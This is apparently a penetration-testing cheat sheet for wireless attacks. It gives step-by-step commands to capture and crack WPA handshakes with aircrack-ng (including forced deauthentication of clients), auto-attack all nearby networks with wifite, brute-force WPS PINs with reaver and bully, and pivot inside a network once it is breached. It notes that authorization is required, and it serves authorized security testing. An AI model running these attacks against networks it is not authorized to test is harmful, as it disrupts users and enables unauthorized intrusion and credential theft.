# Wireless Tools — WiFi Attack Suite

> Covers: aircrack-ng, reaver, bully, wifite

## Risk Level: HIGH — Requires explicit authorization for wireless testing

---

## aircrack-ng — WiFi Cracking Suite

### When to Use
| Signal | Action |
|---|---|
| WiFi pentest authorized | Full wireless assessment |
| WPA/WPA2 handshake captured | Crack with wordlist |
| WEP network found | Crack (automated, always works) |
| Need to capture handshake | Deauth + capture |

### Attack Flow
```bash
# 1. Enable monitor mode
airmon-ng start <interface>

# 2. Scan for networks
airodump-ng <mon_interface>

# 3. Target specific network + capture
airodump-ng -c <channel> --bssid <bssid> -w capture <mon_interface>

# 4. Deauth to force handshake (in new terminal)
aireplay-ng -0 5 -a <bssid> <mon_interface>

# 5. Crack handshake
aircrack-ng -w <wordlist> capture-01.cap

# 6. Stop monitor mode
airmon-ng stop <mon_interface>
```

### Key Concepts
- **Monitor mode** = promiscuous wireless listening
- **Handshake** = WPA 4-way handshake, needed to crack
- **Deauth** = forces clients to reconnect, triggering handshake
- **WEP** = always crackable with enough IVs
- **WPA/WPA2** = dictionary-based, depends on password strength

---

## wifite — Automated WiFi Attacker

### When to Use
| Signal | Action |
|---|---|
| Want automated WiFi attack | One command does everything |
| Multiple targets | Wifite handles them in sequence |
| Quick assessment | Faster than manual aircrack flow |

### Common Invocations
```bash
# Auto-attack all nearby networks
wifite

# Target specific BSSID
wifite --bssid <bssid>

# WPA only
wifite --wpa

# With wordlist
wifite --dict <wordlist>

# Kill interfering processes
wifite --kill
```

---

## reaver / bully — WPS Attack

### When to Use
| Signal | Action |
|---|---|
| WPS enabled on target AP | PIN brute force |
| WPA password too strong | WPS bypass |

### Common Invocations
```bash
# Reaver WPS brute
reaver -i <mon_interface> -b <bssid> -vv

# Bully (alternative, sometimes works when reaver doesn't)
bully -b <bssid> -c <channel> <mon_interface>

# Check WPS status
wash -i <mon_interface>
```

---

## Junior Mistakes

- Forgetting monitor mode (nothing works without it)
- Deauthing without capturing (capture must be running first)
- Cracking WPA with small wordlist (need good wordlist or hashcat)
- Not checking if WPS is locked after failed attempts
- Testing unauthorized networks (illegal)

## Pivot After Wireless

```
WiFi password cracked?
  ├─ Connect to network → internal network scan
  ├─ Credential reuse?  → try password on other services
  └─ Internal pivot     → nmap internal range, MITM

WPS PIN found?
  └─ Recovers WPA password → same as above
```
